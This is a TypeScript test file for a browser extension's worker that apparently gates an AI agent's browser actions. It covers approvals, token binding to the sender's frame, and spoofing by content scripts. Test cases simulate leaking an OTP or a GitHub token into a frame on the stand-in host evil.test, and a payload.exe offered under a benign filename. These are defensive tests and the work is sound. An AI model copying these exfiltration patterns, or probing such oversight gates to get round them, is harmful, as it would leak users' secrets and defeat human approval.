        set: async (items: Record<string, unknown>) => {
          for (const [k, v] of Object.entries(items)) local.set(k, structuredClone(v));
        },
        setAccessLevel: async (o: unknown) => void localAccessLevels.push(o),
      },
      session: {
        get: async (k: string) => (data.has(k) ? { [k]: structuredClone(data.get(k)) } : {}),
        set: async (items: Record<string, unknown>) => {
          for (const [k, v] of Object.entries(items)) data.set(k, structuredClone(v));
        },
        setAccessLevel: async (o: unknown) => void accessLevels.push(o),
        remove: async (k: string) => void data.delete(k),
      },
    },
    // The approval window and the downloads gate (gate lane), the navigation session rules (guard lane).
    windows: { create: async () => ({ id: 1, tabs: [{ id: 9 }] }), update: async () => ({}), onRemoved: noop },
    downloads: {
      onDeterminingFilename: { addListener: (f: NonNullable<typeof downloadListener>) => void (downloadListener = f) },
      cancel: async () => undefined,
      download: async (o: { url: string; conflictAction?: string }) => {
        downloaded.push(o);
        return 1;
      },
    },
    declarativeNetRequest: { getSessionRules: async () => [], updateSessionRules: async () => undefined },
    tabs: {
      query: async () => activeTabs.map((id) => ({ id })),
      sendMessage: (tabId: number, msg: unknown, opts?: { frameId?: number }) => {
        sent.push({ tabId, msg, ...(opts !== undefined ? { opts } : {}) });
        return Promise.resolve();
      },
      onRemoved: noop,
      onCreated: noop,
      update: async () => ({}),
    },
    webNavigation: { onCommitted: noop, onCreatedNavigationTarget: noop, onErrorOccurred: noop },
  };
  vi.stubGlobal("chrome", fake);
  await import("../../src/worker/index.js");
  return {
    sent,
    downloaded,
    accessLevels,
    localAccessLevels,
    stored: () => data.get("ls.state") as ReturnType<Worker["stored"]>,
    offerDownload: (item) => {
      if (downloadListener === undefined) throw new Error("worker registered no download listener");
      return downloadListener(item, () => undefined);
    },
    send: (raw, sender) =>
      new Promise((resolve) => {
        if (listener === undefined) throw new Error("worker registered no listener");
        if (listener(raw, sender, resolve) === false) resolve(DROPPED);
      }),
  };
}

function checkMsg(action: Record<string, unknown>) {
  return { type: "action.check", action };
}
const changePassword = (bodyFrame = { tabId: 99, frameId: 0, origin: "https://evil.test" }) => ({
  kind: "activate",
  frame: bodyFrame,
  elementPath: "html>body>button",
  label: "Change password",
  role: "button",
  tag: "button",
  context: { pageUrl: "https://shop.test/settings" },
});

describe("worker", () => {
  afterEach(() => {
    vi.unstubAllGlobals();
    vi.doUnmock("../../src/worker/log.js");
  });

  it("restricts chrome.storage.session to trusted contexts", async () => {
    const w = await bootWorker();
    expect(w.accessLevels).toEqual([{ accessLevel: "TRUSTED_CONTEXTS" }]);
  });

  it("m10: restricts chrome.storage.local (settings, link state) to trusted contexts too", async () => {
    const w = await bootWorker();
    expect(w.localAccessLevels).toEqual([{ accessLevel: "TRUSTED_CONTEXTS" }]);
  });

  it("I7: approve, deny and agent mode only from the side panel or our own approval window; settings and the log only from the side panel", async () => {
    const w = await bootWorker();
    const inTab: FakeSender = { ...ui, tab: { id: 7, windowId: 42 } };
    const popup: FakeSender = { id: EXT, url: `chrome-extension://${EXT}/popup.html`, origin: `chrome-extension://${EXT}` };
    const surface = { ok: false, reason: "surface" };
    // Our side panel page opened in an ordinary tab (an automation client can do that): it can read, not decide.
    expect(((await w.send({ type: "ui.state" }, inTab)) as UiState).agentMode).toBe(false);
    expect(await w.send({ type: "ui.agentMode", on: true }, inTab)).toEqual(surface);
    expect(await w.send({ type: "ui.settings.set", patch: { keepEvidence: true } }, inTab)).toEqual(surface);
    expect(await w.send({ type: "ui.log.list" }, inTab)).toEqual(surface);
    expect(await w.send({ type: "ui.link.set", on: true }, inTab)).toEqual(surface);
    expect(await w.send({ type: "ui.agentMode", on: true }, popup)).toEqual(surface);
    // A pending approval: refused from a tab, and from approval.html in a window that is not the one the worker opened.
    const r = (await w.send(checkMsg(changePassword()), cs(3, 2, "https://shop.test/settings"))) as GateReply;
    expect(await w.send({ type: "ui.approve", approvalId: r.approvalId }, inTab)).toEqual(surface);
    const strayWindow: FakeSender = { id: EXT, url: `chrome-extension://${EXT}/approval.html`, tab: { id: 8, windowId: 999 } };
    expect(await w.send({ type: "ui.approve", approvalId: r.approvalId }, strayWindow)).toEqual(surface);
    expect(await w.send({ type: "ui.deny", approvalId: r.approvalId }, strayWindow)).toEqual(surface);
    // The approval window the worker opened (the fake windows.create returns window 1 with tab 9) may approve; it may not change settings.
    const ownWindow: FakeSender = { id: EXT, url: `chrome-extension://${EXT}/approval.html`, tab: { id: 9, windowId: 1 } };
    expect(await w.send({ type: "ui.settings.set", patch: { keepEvidence: true } }, ownWindow)).toEqual(surface);
    expect(await w.send({ type: "ui.approve", approvalId: r.approvalId }, ownWindow)).toEqual({ ok: true });
    // The side panel (no tab) may do all of it.
    expect(await w.send({ type: "ui.agentMode", on: true }, ui)).toEqual({ ok: true });
    expect((await w.send({ type: "ui.settings.get" }, ui)) as { ok: boolean }).toMatchObject({ ok: true });
  });

  it("drops messages from other extensions, web pages, and UI messages sent by content scripts", async () => {
    const w = await bootWorker();
    expect(await w.send({ type: "ui.state" }, { id: "otherextensionidotherextensionid", url: "chrome-extension://otherextensionidotherextensionid/x.html" })).toBe(DROPPED);
    expect(await w.send(checkMsg(changePassword()), { url: "https://evil.test/", tab: { id: 1 }, frameId: 0 })).toBe(DROPPED);
    for (const m of [{ type: "ui.state" }, { type: "ui.approve", approvalId: "x" }, { type: "ui.agentMode", on: false }]) expect(await w.send(m, cs(1, 0, "https://evil.test/"))).toBe(DROPPED);
    // our own page inside a tab is UI, not a content script
    expect(await w.send(checkMsg(changePassword()), { ...ui, tab: { id: 3 }, frameId: 0 })).toBe(DROPPED);
  });

  it("takes tab, frame and origin from the sender, and sends the token only to that frame", async () => {
    const w = await bootWorker();
    const r = (await w.send(checkMsg(changePassword()), cs(3, 2, "https://shop.test/settings"))) as GateReply;
    expect(r.decision.verdict).toBe("approve");
    const st = (await w.send({ type: "ui.state" }, ui)) as UiState;
    expect(st.pending[0]?.origin).toBe("https://shop.test");
    expect(await w.send({ type: "ui.approve", approvalId: r.approvalId }, ui)).toEqual({ ok: true });
    expect(w.sent).toHaveLength(1);
    expect(w.sent[0]).toMatchObject({ tabId: 3, opts: { frameId: 2 } });
  });

  async function approvedToken(w: Worker): Promise<{ token: string; snapshot: ActionSnapshot }> {
    const r = (await w.send(checkMsg(changePassword()), cs(3, 2, "https://shop.test/settings"))) as GateReply;
    await w.send({ type: "ui.approve", approvalId: r.approvalId }, ui);
    const granted = w.sent.at(-1)?.msg as { token: string };
    const snapshot = snapshotOf({ ...(changePassword() as unknown as Extract<NormalizedAction, { kind: "activate" }>), frame: { tabId: 3, frameId: 2, origin: "https://shop.test" } }, "account_security");
    return { token: granted.token, snapshot };
  }

  it("redeems for the approved frame, and refuses the same token from another tab or frame whatever the body says", async () => {
    let w = await bootWorker();
    let a = await approvedToken(w);
    expect(await w.send({ type: "approval.redeem", token: a.token, snapshot: a.snapshot }, cs(4, 2, "https://shop.test/settings"))).toEqual({ ok: false, reason: "tab_mismatch" });
    w = await bootWorker();
    a = await approvedToken(w);
    expect(await w.send({ type: "approval.redeem", token: a.token, snapshot: a.snapshot }, cs(3, 0, "https://shop.test/settings"))).toEqual({ ok: false, reason: "frame_mismatch" });
    w = await bootWorker();
    a = await approvedToken(w);
    expect(await w.send({ type: "approval.redeem", token: a.token, snapshot: a.snapshot }, cs(3, 2, "https://shop.test/settings"))).toEqual({ ok: true });
  });

  // BR18
  it("BR18: redeem takes the frame origin from the sender, not the body", async () => {
    // Fixed by lane/session (worker/index.ts: redeem takes tab, frame and frame origin from the sender).
    const w = await bootWorker();
    const a = await approvedToken(w);
    const r = (await w.send({ type: "approval.redeem", token: a.token, snapshot: a.snapshot }, cs(3, 2, "https://evil.test/"))) as RedeemReply;
    expect(r.ok).toBe(false);
  });

  it("turning agent mode off needs the gated approval; a content script can neither request nor redeem it", async () => {
    const w = await bootWorker();
    await w.send({ type: "ui.agentMode", on: true }, ui);
    const off = (await w.send({ type: "ui.agentMode", on: false }, ui)) as { ok: boolean; approvalId: string };
    expect(((await w.send({ type: "ui.state" }, ui)) as UiState).agentMode).toBe(true);
    expect(((await w.send({ type: "ui.state" }, ui)) as UiState).pending).toHaveLength(0);
    expect(await w.send({ type: "approval.redeem", token: off.approvalId, snapshot: agentModeOffSnapshot() }, cs(1, 0, "https://evil.test/"))).toEqual({ ok: false, reason: "unknown_token" });
    expect(await w.send({ type: "ui.deny", approvalId: off.approvalId }, ui)).toEqual({ ok: true });
    expect(await w.send({ type: "ui.approve", approvalId: off.approvalId }, ui)).toEqual({ ok: false });
    expect(((await w.send({ type: "ui.state" }, ui)) as UiState).agentMode).toBe(true);
    const off2 = (await w.send({ type: "ui.agentMode", on: false }, ui)) as { ok: boolean; approvalId: string };
    expect(await w.send({ type: "ui.approve", approvalId: off2.approvalId }, ui)).toEqual({ ok: true });
    expect(((await w.send({ type: "ui.state" }, ui)) as UiState).agentMode).toBe(false);
    expect(w.sent.some((s) => (s.msg as { type: string }).type === "approval.granted")).toBe(false);
  });

  async function agentWithMailOtp(): Promise<Worker> {
    const w = await bootWorker([1]);
    await w.send({ type: "ui.agentMode", on: true }, ui);
    await w.send({ type: "private.prints", prints: printsFor(OTP_PAGE, "mail.google.com", w.stored().session?.printSalt ?? "") }, cs(1, 0, "https://mail.google.com/mail/u/0/"));
    return w;
  }

  it("an OTP from mail typed into an evil.test frame needs approval when the destination is reported honestly", async () => {
    const w = await agentWithMailOtp();
    const r = (await w.send({ type: "leak.guard", via: "type", text: "482913", destinationHost: "evil.test", elementPath: "input", fieldName: "code" }, cs(1, 1, "https://evil.test/form"))) as LeakReply;
    expect(r.decision.verdict).toBe("approve");
  });

  // BR19
  it("BR19a: for type and paste the destination is the sender's frame, whatever destinationHost the body names", async () => {
    // Fixed by lane/session (worker/index.ts, leak-agent.ts: type and paste are judged against the sender's frame host; the body's host can only make it stricter)
    // and by lane/leakgate (BR19b): every leak exemption must also hold for the sender's frame host, so the body's destination cannot clear it.
    const w = await agentWithMailOtp();
    const r = (await w.send({ type: "leak.guard", via: "type", text: "482913", destinationHost: "mail.google.com", elementPath: "input", fieldName: "code" }, cs(1, 1, "https://evil.test/form"))) as LeakReply;
    expect(r.decision.verdict).toBe("approve");
  });

  it("BR19b: a submit's leak check also judges the sender's frame, not only the page-controlled form action", async () => {
    // Fixed by lane/leakgate (engine/leak.ts: every exemption must also hold for the sender's frame host) with lane/session's
    // sender-derived frame host (worker/index.ts: a submit judges the form action and the sender's frame, strictest wins).
    const w = await bootWorker([1]);
    await w.send({ type: "ui.agentMode", on: true }, ui);
    const r = (await w.send({ type: "leak.guard", via: "submit", text: GH_TOKEN, destinationHost: "api.github.com", elementPath: "form", fieldName: "form" }, cs(1, 0, "https://evil.test/form"))) as LeakReply;
    expect(r.decision.verdict).toBe("approve");
  });

  it("BR19c: private prints are stamped with the sender's registrable domain", async () => {
    // Fixed by lane/session (worker/index.ts: prints are stamped with the sender frame's registrable domain).
    const w = await bootWorker([1]);
    await w.send({ type: "ui.agentMode", on: true }, ui);
    await w.send({ type: "private.prints", prints: printsFor(OTP_PAGE, "mail.google.com", w.stored().session?.printSalt ?? "") }, cs(1, 1, "https://evil.test/"));
    expect(w.stored().session?.prints[0]?.domain).toBe("evil.test");
  });

  // BR20
  it("BR20: classification uses the sender's top-level URL, not the body's pageUrl", async () => {
    // Fixed by lane/session (worker/index.ts: the sender's frame URL classifies; the tab URL and body pageUrl can only make it stricter).
    const w = await bootWorker();
    const consentUrl = "https://accounts.google.com/o/oauth2/v2/auth?client_id=evil";
    const sender: FakeSender = { ...cs(1, 0, consentUrl), tab: { id: 1, url: consentUrl } };
    const r = (await w.send(checkMsg({ ...changePassword(), label: "Allow", context: { pageUrl: "https://example.test/" } }), sender)) as GateReply;
    expect(r.decision.actionClass).toBe("oauth_consent");
  });

  // BR21
  it("BR21: a decision reads state after earlier updates land (no stale read outside the update chain)", async () => {
    // Fixed by lane/session (worker/state.ts: reads wait on the update chain).
    const w = await bootWorker([1]);
    await w.send({ type: "ui.agentMode", on: true }, ui);
    const scanned = w.send({ type: "page.scanned", url: "https://evil.test/", verdict: "quarantine", reasons: [], scanIncomplete: false }, cs(1, 0, "https://evil.test/"));
    const checked = w.send(checkMsg({ ...changePassword(), label: "Place order" }), cs(1, 0, "https://evil.test/"));
    await scanned;
    expect(((await checked) as GateReply).decision.verdict).toBe("deny");
  });

  it("holds an executable URL offered under a benign filename and uses the originating tab's trust", async () => {
    const w = await bootWorker([1]);
    await w.send({ type: "page.scanned", url: "https://evil.test/", verdict: "quarantine", reasons: ["hidden_text"], scanIncomplete: false }, cs(1, 0, "https://evil.test/"));
    expect(w.offerDownload({ id: 1, url: "https://evil.test/payload.exe", filename: "notes.txt", mime: "text/plain", tabId: 1 })).toBe(true);
    // The hold is asynchronous (policy and state loads); wait for it to land, bounded.
    let st = (await w.send({ type: "ui.state" }, ui)) as UiState;
    for (let i = 0; i < 200 && st.pending.length === 0; i++) {
      await new Promise((r) => setTimeout(r, 1));
      st = (await w.send({ type: "ui.state" }, ui)) as UiState;
    }
    expect(w.downloaded).toEqual([]);
    expect(st.pending).toHaveLength(1);
    expect(st.pending[0]?.actionClass).toBe("download_exec");
    expect(st.pending[0]?.untrustedBecause).toContain("quarantine_verdict");
    expect(await w.send({ type: "ui.approve", approvalId: st.pending[0]?.approvalId ?? "" }, ui)).toEqual({ ok: true });
    expect(w.downloaded).toEqual([{ url: "https://evil.test/payload.exe", conflictAction: "uniquify" }]);
  });
});
